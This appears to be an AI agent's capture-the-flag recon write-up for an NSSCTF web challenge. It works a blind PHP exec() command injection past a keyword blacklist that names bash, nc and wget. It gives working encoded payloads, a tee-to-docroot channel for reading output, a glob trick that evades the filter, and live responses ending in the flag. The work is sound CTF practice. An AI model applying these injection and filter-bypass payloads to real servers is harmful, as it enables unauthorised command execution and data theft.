# NSSCTF — `node4.anna.nssctf.cn:27309` recon

**Lane:** recon / ground truth (agent-1, task `t1`, attempt `f04b5427-9ebc-4586-b4b2-9291e6f4caab`)
**Status:** SOLVED — `NSSCTF{1ec6ae10-d171-4bee-88db-e6441c5bcd5a}` (captain-verified)
**Artifacts in this directory:** `solve-recon.py` (payload/filter harness), `solve-flag.py` (one-shot end-to-end replay), `listing.txt` (raw ground-truth dumps), `recon.md` (this file)

---

## 1. Server fingerprint

```
GET http://node4.anna.nssctf.cn:27309/  ->  200 OK
Server:          Apache/2.4.25 (Debian)
X-Powered-By:    PHP/5.6.40
Content-Type:    text/html; charset=UTF-8
Keep-Alive:      timeout=5, max=100
Vary:            Accept-Encoding
Content-Length:  1794
Body:            highlight_file(__FILE__) source dump of index.php
```

Container facts recovered from `env` and `pwd`:

| fact | value | how |
|---|---|---|
| document root | `/var/www/html` | `pwd` |
| exec() child cwd | `/var/www/html` (**= docroot**) | the `tee` file was fetchable at `/node4r1.txt` |
| web user | `uid=33(www-data)` | `id` |
| docroot writable by www-data | **yes** | the exfil itself |
| hostname | `anna38eefb46df_sservice` | `env` |
| TZ | `Asia/Shanghai` | `env` |
| `/tmp`, `/home` | exist, empty, `/tmp` writable | `dir /tmp`, `dir /home` |

Source under test:

```php
<?php highlight_file(__FILE__);
if(isset($_GET['url'])){ $url=$_GET['url'];
  if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url)){ echo "Sorry,you can't use this."; }
  else { echo "Can you see anything?"; exec($url); } }
```

`exec()` output is **not** echoed → blind.

---

## 2. Filter analysis

`preg_match` runs on the **already URL-decoded** value, so percent-encoding is free:
everything can be shipped as `%20`/`%7C`/`%3B` without tripping the `%` rule.

Banned and their real cost:

| token | consequence |
|---|---|
| `-` | **anywhere** → no short options at all. No `ls -l`, no `nl -ba`, no `find -name`, no `tail -n`, and **no filename containing a hyphen** |
| `*` | no star globbing — but single-char `?` **is allowed** and is the live primitive |
| `>`, `<` | no redirects, no `tee f < src` |
| `$`, `"`, `%` | no variables, no quoting, no literal `%` |
| `la` (case-insensitive) | **`flag`, `FLAG`, `last`, `splash`, `-la…` are all dead** — see the trap in §6 |
| `bash nc wget ping ls cat more less phpinfo base64 echo php python mv cp` | word list |

Still allowed and used here: `tee dir find nl head tail awk grep od xxd strings rev sort
curl sh id pwd env wc stat sed printf split dd file`.

**Detector trap (cost a round):** the HTTP body *always* contains **both**
`Sorry,you can't use this.` and `Can you see anything?`, because `highlight_file()` prints
index.php — whose source contains both strings — inside `<code>…</code>`. Judging
blocked/allowed by raw `in body` string-match is therefore meaningless. Correct check:
strip everything up to the **last `</code>`** and test the tail only. Implemented as
`real_output()` in `solve-recon.py`.

---

## 3. Exfiltration channel — the `tee` round trip

Because the exec cwd **is** the writable docroot, any command's stdout can be turned into
a file that Apache then serves:

```
http://node4.anna.nssctf.cn:27309/?url=<CMD>%7Ctee%20<name>.txt
   then
http://node4.anna.nssctf.cn:27309/<name>.txt
```

`name` must not contain `-`, `*`, `$`, `%`, `"`, `>` ,`<`, and must not contain `la`,
`ls`, `cat`, … (`node4r1.txt` is safe; `node4-1.txt` is **not**, the hyphen kills it).

### Proof (byte-for-byte, first successful probe)

```
REQ  http://node4.anna.nssctf.cn:27309/?url=id%7Ctee%20node4r1.txt
     decoded payload: id|tee node4r1.txt
     response tail after </code>: 'Can you see anything?'

GET  http://node4.anna.nssctf.cn:27309/node4r1.txt        (54 bytes)
 ->  uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Round trip **proven**: blind RCE → file in docroot → served over HTTP.

### All variants that work

| channel | payload fragment | notes |
|---|---|---|
| pipe + tee | `...%7Ctee%20x.txt` | primary, stdin of `tee` |
| `;` chaining | `%3B` | many commands in one request |
| `%09` tab | instead of `%20` space | also survives |
| no-write read | `nl /fllll%3Faaaaaaggggggg` | `nl`, `head`, `awk`, `grep`, `od` all option-free |

---

## 4. Filesystem enumeration → flag

```
?url=dir%20%2F%7Ctee%20r2.txt          ->  /r2.txt   (166 bytes)
```

```
a_here_is_a_f1ag  dev		       home   media  proc  sbin  tmp
bin		  etc		       lib    mnt    root  srv	 usr
boot		  flllllaaaaaaggggggg  lib64  opt    run   sys	 var
```

Two root-level candidates. Exact lengths (padding stripped):

| path | len | typeable literally? | content |
|---|---|---|---|
| `/a_here_is_a_f1ag` | 16 | **yes** (no banned substring) | `true_flag_1s_1n_flllllaaaaaaggggggg` (decoy breadcrumb) |
| `/flllllaaaaaaggggggg` | 19 | **no** — contains `la` | **`NSSCTF{1ec6ae10-d171-4bee-88db-e6441c5bcd5a}`** |

There is no `/flag` and no `/flag.txt`; and neither could ever be typed anyway
(`flag` contains `la`).

### The glob trick

`/flllllaaaaaaggggggg` can never appear in the payload, because `…l` + `a…` = `la`.
Replace exactly one character at the `l|a` boundary with the allowed single-char glob `?`:

```
/fllll?aaaaaaggggggg        # 19 chars, identical length, unique match, no "la" substring
```

Verified live (payloads and raw output in `listing.txt` §6):

```
?url=file%20%2Fa_here_is_a_f1ag%7Ctee%20f0.txt;nl%20%2Fa_here_is_a_f1ag%7Ctee%20f1.txt;file%20%2Ffllll%3Faaaaaaggggggg%7Ctee%20f2.txt;nl%20%2Ffllll%3Faaaaaaggggggg%7Ctee%20f3.txt

/f0.txt -> /a_here_is_a_f1ag: ASCII text
/f1.txt ->      1	true_flag_1s_1n_flllllaaaaaaggggggg
/f2.txt -> /flllllaaaaaaggggggg: ASCII text
/f3.txt ->      1	NSSCTF{1ec6ae10-d171-4bee-88db-e6441c5bcd5a}
```

**Flag: `NSSCTF{1ec6ae10-d171-4bee-88db-e6441c5bcd5a}`**

### Candidate-path table (for other lanes / writeup)

| path | exists | length | reachable as |
|---|---|---|---|
| `/flag`, `/flag.txt` | no | — | never (filter-dead) |
| `/a_here_is_a_f1ag` | yes | 16 | literal `/a_here_is_a_f1ag` |
| `/flllllaaaaaaggggggg` | yes | 19 | `/fllll?aaaaaaggggggg` |
| `/tmp` | yes, empty | — | literal |
| `/home` | yes, empty | — | literal |
| `/root` | yes | — | not readable by www-data |

---

## 5. Decoys

1. **`FLAG=not_flag`** in the environment (see `listing.txt` §5).
2. **`/a_here_is_a_f1ag`** — a readable breadcrumb whose *content* points at the real file.
3. The `printenv`/`env` route to the env var is a trap — see §6.

---

## 6. ⚠ The trap the captain hit live: the variable *name* `FLAG` is itself filtered

The regex is case-insensitive and `la` is an **un-anchored substring** rule. `FLAG`
contains `LA`. So:

```
printenv FLAG      ->  decoded value contains "LA"  ->  preg_match matches  ->  BLOCKED
```

and because PHP evaluates the **whole** `$_GET['url']` string, one bad token kills the
entire payload:

```
?url=id%3Bprintenv%20FLAG        ->  Sorry,you can't use this.       (nothing at all runs)
```

Consequences worth writing down:

* You cannot name the variable at all. Not `FLAG`, not `$FLAG`, not `env|grep FLAG`
  (`grep FLAG` also contains `LA`).
* You can only reach it **without ever spelling it**, e.g. disambiguate by pattern:
  `env%7Cgrep%20??A?` (or `awk /^FL/ ` is impossible too — `/^FL/` is fine, but any
  literal `FLAG` is not). In practice: dump `env`, read it back, grep **locally**.
* Any chained payload where *one* token is blocked produces the exact same "Sorry" body
  as a fully-blocked payload — so a blocked token looks like "the whole approach failed".
  **Always run the offline regex simulation first** (`solve-recon.py check '<cmd>'`), it
  is the only cheap way to spot this class of silent failure.
* The value was a decoy anyway (`not_flag`), but the *name-of-the-variable* rule is the
  general lesson: the `la` blacklist also eats ordinary English words (`flag`, `last`,
  `splash`, `-la`), which is why option-free commands were mandatory here.

---

## 7. Replay

```
cd node4-27309
python solve-recon.py check '<decoded cmd>'       # offline filter simulation
python solve-recon.py run '<decoded cmd>' out.txt # send + fetch the tee file
python solve-recon.py fetch out.txt               # GET a file from the docroot
python solve-flag.py                              # full end-to-end chain -> flag
```

### ⚠ Availability note (recorded 2026-10-06, end of lane)

The last probe issued was a full sweep `?url=find%20%2F%7Ctee%20r7.txt` (49 s wall). Before
its output could be fetched, **the target became unreachable — TCP connection refused on
`/`, `/r2.txt` and `/f3.txt`**. All evidence above was already captured before that, and
`listing.txt` is therefore built from `dir /` ground truth rather than `find /`. Anyone
replaying live must first confirm the instance is back up; the flag and the exact chain
are unaffected.
